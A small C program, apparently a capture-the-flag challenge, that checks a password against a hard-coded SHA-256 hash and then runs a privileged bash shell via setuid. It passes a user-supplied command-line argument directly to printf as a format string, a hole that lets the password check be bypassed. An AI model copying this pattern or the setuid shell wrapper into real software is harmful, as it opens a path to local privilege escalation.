#include <stdio.h>
#include <stdlib.h>
#include <termios.h>
#include <unistd.h>
#include <string.h>
#include <openssl/sha.h>

#define PASSWORD_HASH "\xc0\x06\x62\x71\xef\xa9\x6a\xeb\xd0\x49\x1c\xc2\xe5\x83\x7e\xac\x74\x32\x8f\xeb\x84\x92\x45\xca\x40\x5e\x91\xb3\x6b\x80\x9d\xc0"

int simpleSHA256(void* input, unsigned long length, unsigned char* md)
{
    SHA256_CTX context;
    if(!SHA256_Init(&context))
        return 0;

    if(!SHA256_Update(&context, (unsigned char*)input, length))
        return 0;

    if(!SHA256_Final(md, &context))
        return 0;

    return 1;
}

void run_shell() {
	execl("/bin/bash", "bash", "-l", (char*)NULL);
	perror("execl");
	exit(1);
}

void switch_echo(int enable) {
	struct termios ts;

	if (tcgetattr(1, &ts) < 0)
		return;
	if (enable)
		ts.c_lflag |= ECHO;
	else
		ts.c_lflag &= ~ECHO;
	tcsetattr(1, TCSANOW, &ts);
}

void check_password(int *is_password_correct, char *custom_prompt) {
	char buf[32];
    unsigned char hash[sizeof(PASSWORD_HASH)-1];
	int len = 0;

	if (custom_prompt) {
		printf(custom_prompt);
	} else {
		printf("Enter password: ");
	}
	fflush(stdout);
	switch_echo(0);
	while (len < sizeof(buf)-1) {
		if (read(1, &buf[len], 1) > 0) {
			if (buf[len] == '\n' || buf[len] == '\r') {
				break;
			} else
				len++;
		} else {
			buf[0] = 0;
			break;
		}
	}
	buf[len] = 0;
	switch_echo(1);
	printf("\n");
    if (simpleSHA256(buf, len, hash) && 
            memcmp(hash, PASSWORD_HASH, sizeof(PASSWORD_HASH)-1)==0)
		*is_password_correct = 1;
	return;
}

int main(int argc, char **argv) {
	int is_ok = 0;

	if (argc > 1)
		check_password(&is_ok, argv[1]);
	else
		check_password(&is_ok, NULL);

	if (is_ok) {
		setuid(geteuid());
		run_shell();
	}
	return 1;
}
